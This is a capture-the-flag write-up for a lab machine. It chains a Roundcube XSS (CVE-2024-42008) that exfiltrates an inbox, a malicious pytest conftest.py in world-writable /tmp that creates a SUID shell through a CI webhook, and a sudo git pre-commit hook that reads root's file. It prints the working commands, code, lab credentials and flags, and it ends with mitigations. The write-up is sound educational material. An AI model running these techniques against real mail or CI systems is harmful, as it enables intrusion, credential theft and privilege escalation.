# CVE-2024-42008, CI/CD Injection, sudo git Writeup

## Flags
- **User:** `5038{Xss_Email_Leakage}`
- **Root:** `5038{Unit_Tests_C@n_Somet1mes_Be_Bad_4_You}`

---

## Attack Chain

```
nmap + Gobuster → Roundcube 1.6.6 discovered
       ↓
CVE-2024-42008 XSS → Webmaster inbox exfiltrated
       ↓
SSH credentials stolen → webmaster shell (port 1222)
       ↓
USER FLAG ✅
       ↓
/tmp world-writable + pytest rootdir hijacking
       ↓
Malicious conftest.py → CI webhook → SUID bash as admin
       ↓
sudoers: admin NOPASSWD git commit
       ↓
Malicious pre-commit hook → runs as root
       ↓
ROOT FLAG ✅
```

---

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.64.4
```

Key ports:
- `22` - SSH
- `25` - SMTP (Postfix)
- `80` - HTTP (Apache / hacking.local)
- `1222` - SSH (webmaster)
- `8000` - FastAPI (CI webhook server)
- `12222` - SSH (admin)

Virtual host enumeration:
```bash
gobuster vhost -u http://hacking.local -w /usr/share/wordlists/dirb/common.txt --append-domain --exclude-length 6080
```

Found:
- `webmail.hacking.local` - Roundcube 1.6.6 ⚠️ CVE-2024-42008
- `gitweb.hacking.local` - Gitea instance
- `mail.hacking.local` - Mail server

Credentials for test account found at `/email.html`:
```
test@hacking.local / testing
```

---

## Stage 1: CVE-2024-42008 - XSS Email Exfiltration

**Vulnerability:** Roundcube 1.6.6 fails to sanitise the `name` attribute of the HTML `<body>` tag. An attacker can inject CSS animation properties and a JavaScript event handler. The Bootstrap class `progress-bar-stripes` (already loaded by Roundcube) triggers the animation on render, no click required from the victim.

**Why this was tricky:**
- Initially used the wrong CVE (CVE-2024-37383, only fires on click, useless for a bot)
- Payload kept failing silently, the entire injection must be on ONE line inside the `name` attribute. Any line break breaks the CSS animation.

**Payload:** See [`xss_payload.py`](xss_payload.py)

The JavaScript fetches the victim's inbox message list, retrieves each email's source, and exfiltrates the URL-encoded content to an HTTP listener. All requests use relative URLs so they go to the Roundcube server, bypassing network isolation between the bot (10.17.68.64) and the attacker (192.168.64.3).

**Listener:**
```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[GET]', self.path)
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 9999), H).serve_forever()"
```

**Result:** Webmaster's inbox exfiltrated. Email from `admin@hacking.local` — subject: "Password for new CI server":
```
SSH Password: Kzn4fg9Qj3fXB68x
SSH port: 1222
```

---

## Stage 2: User Flag

```bash
ssh webmaster@192.168.64.4 -p 1222
# Password: Kzn4fg9Qj3fXB68x

cat ~/user.txt
# 5038{Xss_Email_Leakage}
```

---

## Stage 3: Privilege Escalation to Admin - CI/CD Injection

**The setup:**
- FastAPI webhook server on port 8000, runs as `admin` via `sudo -u admin`
- Webhook clones `admin/FastAPI_Site` from Gitea and runs `pytest` from `/tmp/FastAPI_Site`
- `/tmp` is world-writable

**The trick:**
pytest discovers its rootdir by walking *upward* from the test directory. Since `/tmp` is the parent of `/tmp/FastAPI_Site`, a `pytest.ini` in `/tmp` gets picked up as the root config — and any `conftest.py` there gets executed as admin.

**What didn't work first:**
- Tried modifying files in `/tmp/FastAPI_Site/`, owned by admin:admin, no write access as webmaster
- Tried modifying `.git/config` — sticky bit on `/tmp` blocked it

**The fix:** Create *new* files in `/tmp` (world-writable, allowed):

```bash
# /tmp/pytest.ini
cat > /tmp/pytest.ini << 'EOF'
[pytest]
testpaths = .
EOF

# /tmp/conftest.py  
cat > /tmp/conftest.py << 'EOF'
import os, subprocess
def pytest_configure(config):
    subprocess.Popen(['bash', '-c', 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'])
EOF
```

See full payload: [`conftest.py`](conftest.py)

**Trigger the webhook:**
```bash
curl -X POST http://192.168.64.4:8000/webhooks \
  -H "Content-Type: application/json" \
  -d '{"ref":"refs/heads/main"}'
```

```bash
ls -la /tmp/bash
# -rwsr-sr-x 1 admin admin ...

/tmp/bash -p
whoami
# admin
```

---

## Stage 4: Root - sudo git commit Hook Abuse

**The misconfiguration:**
```bash
cat /etc/sudoers
# admin ALL=(ALL:ALL) NOPASSWD: /usr/bin/git commit
```

Git runs pre-commit hooks as the same user as the git process. `sudo git commit` = hooks run as root.

**The loginuid problem:**
Running `sudo` from the SUID bash shell failed even with euid=admin because `/proc/self/loginuid` was still `1000` (webmaster). Sudo checks this and ignores the NOPASSWD rule.

**The fix:** Run `sudo git commit` from *within* the CI process itself (loginuid=4294967295, unset, root-initiated). Updated the conftest.py in the CI repo to run the full chain.

**Setup the hook:**
```bash
mkdir -p /home/admin/myhooks
cat > /home/admin/myhooks/pre-commit << 'EOF'
#!/bin/bash
cat /root/root.txt > /tmp/root_flag.txt
chmod 777 /tmp/root_flag.txt
EOF
chmod +x /home/admin/myhooks/pre-commit
```

See full payload: [`pre-commit`](pre-commit)

**Updated conftest in CI repo** (see [`conftest.py`](conftest.py)) to run:
```python
subprocess.run(['sudo', '-n', '/usr/bin/git', 'commit'], capture_output=True)
```

**Trigger webhook again:**
```bash
curl -X POST http://192.168.64.4:8000/webhooks \
  -H "Content-Type: application/json" \
  -d '{"ref":"refs/heads/main"}'

cat /tmp/root_flag.txt
# 5038{Unit_Tests_C@n_Somet1mes_Be_Bad_4_You}
```

---

## Summary

| Step | Technique | Why it worked |
|------|-----------|---------------|
| Recon | nmap + vhost gobuster | Found Roundcube 1.6.6 and FastAPI CI |
| XSS | CVE-2024-42008 | Unpatched Roundcube, unauthenticated SMTP |
| Creds | Email exfiltration | Admin sent SSH password in plaintext email |
| User | SSH on port 1222 | Password reuse from exfiltrated email |
| Admin | pytest conftest injection | World-writable /tmp, no explicit pytest rootdir config |
| Root | sudo git commit hook | NOPASSWD rule, git hooks run as sudo user |

---

## Mitigations

- Upgrade Roundcube to 1.6.8+
- Never send credentials via email, use a secrets manager
- Run CI in a restricted directory (not /tmp), as a low-privilege dedicated user
- Remove the `NOPASSWD: git commit` sudo rule
- Require SMTP authentication